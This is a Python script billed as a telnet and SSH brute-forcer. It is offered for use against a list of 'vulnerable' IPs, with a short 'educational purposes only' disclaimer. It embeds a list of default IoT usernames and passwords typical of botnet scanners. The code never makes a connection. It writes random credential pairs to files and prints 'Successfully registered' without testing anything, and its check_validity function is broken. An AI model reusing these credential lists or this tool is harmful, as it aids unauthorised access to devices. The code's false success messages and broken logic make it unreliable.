# TELNET AND SSH BRUTEFORCE v2.1
# Made by: weasley 2#2909

# Download python3 and run the file as showcased in the video.
# Put a list with vulnerable IP's in the scripts directory.
# UPDATE: New things added to the bruteforcing method now it separates telnet and SSH ports.
# You can now change the combos and also uncap the timeout as you requested it, so here you go.
# Keep in mind it can crash your VPS if it overheats, so don't mess around with it (for your good).
# If you want to uncap the timeout remove or comment the following line "and int(timeout) >= 2".
# For educational purposes only! If you abuse it or use it inappropriate I don't take any responsibility.

#ALL RIGHTS RESERVED, COPYRIGHT AND TRADEMARK.


# import requirements
import sys
import time
import random

err_code = 0
host = (input('Enter Host(default localhost): '))
port= input('Enter Port(23 telnet or 22 SSH): ')
timeout= input('Enter timeout(default 3): ')

# arrays with combos (customize your pulls!)
combo_user = [
	"user",
	"root",
	"admin",
	"guest",
	"default",
	"support",
	"administator",
]

combo_passw = [
	"pass",
	"root",
	"123",
	"1234",
	"ubnt",
	"user",
	"adm",
	"bin",
	"guest",
	"vizxv",
	"12345",
	"password",
]

# searching for an existing lists
try:
	with open(
		"list.txt", "r") as iplist:
		sfw_combo = iplist.readlines(
			)
		sfw_combo = [ip.strip() for ip in sfw_combo]
except:
	err_code = 1
	print("\033[H\033[J")
	print("\033[35mStatus: \033[31mNo list.txt\n\033[35mPort: \033[0m" + port+ "\n\033[35mTimeout: \033[0m" + timeout+ "\n\033[35mError Code: \033[0m"+str(err_code))
	sys.exit()

# check & register possible combos
class bruteforce:
	def __init__(self, ip, port, user, passw):
		self.ip = ip
		self.port = port
		self.user = user
		self.passw = passw
	def is_usable(self):
		if len(self.ip) > 1 and len(self.ip) >= 7 and self.ip.__contains__('.') and self.port == "23" and int(timeout) <= 61 and int(timeout) >= 2: # <--- remove or comment this!
			file = open("telnet_list.txt", "a")
			file.write(self.ip + ":" + self.port + " " + self.user + ":" + self.passw + "\n")
			return(
				"\033[32mSuccessfully registered \033[35m" + self.ip + ":" + self.port + "\033[0m | \033[35mTimeout: \033[0m" + timeout + "\033[0m"
				)
		elif self.port == "22":
			file = open("ssh_list.lst", "a")
			file.write(self.ip + "/" + self.port) # + " " + self.user + "/" + self.passw + "\n")
			return(
				"\033[32mSuccessfully registered \033[35m" + self.ip + ":" + self.port + "\033[0m | \033[35mTimeout: \033[0m" + timeout + "\033[0m"
				)
		elif self.ip.__contains__(
			"[a-zA-Z]") or self.port.__contains__("[a-zA-Z]"):
			return (
				"\033[35m" + self.ip + ":" + self.port + "\033[0m is \033[31mnot valid\033[0m!\033[35m 'critical error'\033[0m!"
				)	
		else:
			return (
				"\033[35m" + self.ip + ":" + self.port + "\033[0m is \033[31mnot valid\033[0m!\033[35m 'critical error'\033[0m!"
				)
def check_validity():
	if sfw_combo != "null":
		try:
			with open("telnet_list.txt", "ssh_list.txt", "r" ) as check_validity:
				is_valid = check_validity.readlines(
					)
				is_valid = [valid_combo.strip(
					) for valid_combo in is_valid
				]
				data = open("data.tmp", "a")
				data.write(self.user+ ":"+ self.pasw + " " + is_valid
					)
		except:
			return
	else:
		err_code = 2
		print("\033[H\033[J")
		print("\033[35mStatus: \033[31Critical error\n\033[35mPort:\033[0m" + port+ "\n\033[35mTimeout:\033[0m" + timeout+ "\n\033[35mError Code: \033[0m"+str(err_code))
		sys.exit()	

# start the bruteforce
print("\033[H\033[J")
print("\033[35mStatus: \033[32mConnected to: \033[0m"+ host +"\n\033[35mPort: \033[0m" + port+ "\n\033[35mTimeout: \033[0m" + timeout+ "\n\033[35mError Code: \033[0m"+str(err_code))
for single_ip in sfw_combo:
	time.sleep(int(timeout))
	random_user = random.choice(combo_user)
	random_passw = random.choice(combo_passw)
	config = (bruteforce(single_ip, port, random_user, random_passw))
	print(config.is_usable())
	check_validity()	

# exit code 0
print("\033[H\033[J")
print("\033[35mStatus: \033[32mDone!\n\033[35mPort: \033[0m" + port+ "\n\033[35mTimeout: \033[0m" + timeout + "\n\033[35mError Code: \033[0m"+str(err_code))
sys.exit()
